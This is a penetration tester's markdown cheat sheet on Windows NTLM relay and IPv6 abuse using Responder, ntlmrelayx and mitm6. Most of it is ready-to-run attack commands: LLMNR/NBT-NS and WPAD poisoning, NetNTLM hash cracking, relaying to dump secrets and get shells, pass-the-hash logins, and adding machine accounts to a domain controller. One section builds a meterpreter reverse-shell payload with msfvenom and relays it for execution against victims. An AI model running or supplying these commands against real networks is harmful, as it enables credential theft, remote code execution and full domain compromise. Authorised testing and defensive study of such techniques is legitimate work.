# Windows Relay Attacks - NTLM and IPv6 abuses

Reference
```
Responder 
https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/responder-20-owning-windows-networks-part-3/
https://www.thehacker.recipes/ad/recon/responder
https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa
https://www.hackingarticles.in/a-detailed-guide-on-responder-llmnr-poisoning/
https://notsosecure.com/pwning-with-responder-a-pentesters-guide
https://pentestlab.blog/tag/responder/ 

Attacking IPv6 
https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/


``` 
## Responder 
The Responder is an IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay. Internal Penetration Testing has been successful in obtaining a foothold or compromising entire domains through a technique called NTLM relaying. This is still alive. I will cover classic and modern techniques to do NTLM relay attacks, together with IPv6 network abuse with MIMT6.  

```
Most successful command options are -dwP. 

responder -I eth0 -dwP 
-d, --DHCP: Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False
-d,--wpad: Start the WPAD rogue proxy server. Default value is False
-P, --ProxyAuth: Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. 
```

### Attack 0 - Just observe the environment (No poisoning)
```bash
# Comment out IPv6 addresses in /etc/resolv.conf 
responder -I eth0 -A

# You should see some NBT-NS and LLMNR network flows. The responder might capture hashes. 
# Rembember that NetNTLM is not actual NTLM hashes that you can pass the hash to other machines. 
```

### Attack 0.5 - LLMNR/NBT-NS Poisoning through SMB
You will start poisoning LLMNR/MBT-NS network flow. 
```bash
responder -I eth0
# Victim (or Attacker in a compromised machine) will initiate SMB connection to the Kali machine  
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
In a real world attack scenario, after setting up the responder's listener, we have to wait for users in the network to search for a non-existing machine. Or maybe  you do social engineering that embeds a link to the attacker's address in emails or you may find some vulnerabilities (RFI, SSRF, SQLi-RCE, any other) that can allows an attacker to invoke a SMB connection to their machine. 


### Attack 0.5 again - LLMNR/NBT-NS Poisoning through WPAD
```bash
responder -I eth0 -wd
# Victim (or Attacker in compromised machine) will enter credentials to access
hashcat -m 5600 HTTP-NTLMv2-fe80::ddc5:3b8f:e421:a88a.txt /usr/share/wordlists/rockyou.txt
```

### Attack 1 - Classic NTLM relay
```bash
sudo vi /etc/responder/Responder.conf 
# Ensure you configured the /etc/responder/Responder.conf file to disable SMB and HTTP servers. 
crackmapexec smb 10.0.0.0/24 --gen-relay-list /tmp/targets.txt 
sudo responder -I eth0 -PvdDw
# Check /tmp/tragets.txt first and edit the endpoints if required. 
ntlmrelayx.py -smb2support -tf /tmp/targets.txt 
# Victim (or Attacker in compromised machine) will will access to Kali machine. 
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt


ntlmrelayx.py -smb2support -tf /tmp/targets.txt -i # Interactive option
# Victim (or Attacker in compromised machine) will will access to Kali machine.
nc -nv 127.0.0.1 11000 # Check port number 
shares
use C$ 
ls 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.208 LPORT=80 -f exe -o rshell.exe
sudo msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set AutoRunScript post/windows/manage/migrate;set LHOST 10.0.0.208 ;set LPORT 80;run -j"
sudo responder -I eth0 -PvdDw
ntlmrelayx.py -smb2support -tf /tmp/targets.txt -e ./rshell.exe --no-http-server # execution option with --no-http-server option is used due to port 80 used for reverse shell connection
# Victim (or Attacker in compromised machine) will will access to Kali machine.  
# Meterpreter session will kick off. 

ntlmrelayx.py -smb2support -tf /tmp/targets.txt -c whoami # Command option 
```


### Attack 2 - Proxy Chaining the SMB connection using RESPONDER and NTLM Relay
```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list /tmp/10.10.10.0.txt
sudo vi /etc/proxychains4.conf 
# Add socks4 127.0.0.1 1080
sudo vi /etc/responder/Responder.conf 
# Ensure you configured the /etc/responder/Responder.conf file to disable SMB and HTTP servers. 
ntlmrelayx.py -socks -smb2support -tf /tmp/10.10.10.0.txt
proxychains4 -q secretsdump.py FILE01/Administrator:anypassword@10.10.10.21
proxychains4 -q smbexec.py FILE01/Administrator:anypassord@10.10.10.21

# This will work with non admin users 
proxychains4 -q smbclient.py FILE01/Administrator:anypassword@10.10.10.21


# EvilWin
evil-winrm -u Administrator -H '849bb5d6ce5262b05fb7547db48b54a3' -i 192.168.1.161

# Remote desktop may work
xfreerdp /u:Administrator /v:10.10.10.21 /pth:849bb5d6ce5262b05fb7547db48b54a3 +clipboard


```

### Attack 3 MIMT6 - WPAD exploitation
mitm6 is a tool which focusses on an easy to setup solution that selectively attacks hosts and spoofs DNS replies, while minimizing the impact on the networkâ€™s regular operation.


```bash
cd /opt/ad/mitm6/mitm6    
#Kali
python mitm6.py -d contoso.local -i eth1
ntlmrelayx.py -6 -t ldaps://10.10.10.1 -wh fakewd.contoso.local -l lootme
# Restart the victim machine. You see lengthy responses from the victim machine.
cd lootme
# Check all html files for your reference

# Kali - this will add a computer with user name and password to the DC 
ntlmrelayx.py -6 -t ldaps://10.10.10.1 -wh fakewd.contoso.local -l lootme --add-computer
# Restart the victim machine. You see a message for adding the computer account with username and password

For the MIMT6 with Contstrainted Deligation, check the following URL.
https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/

```
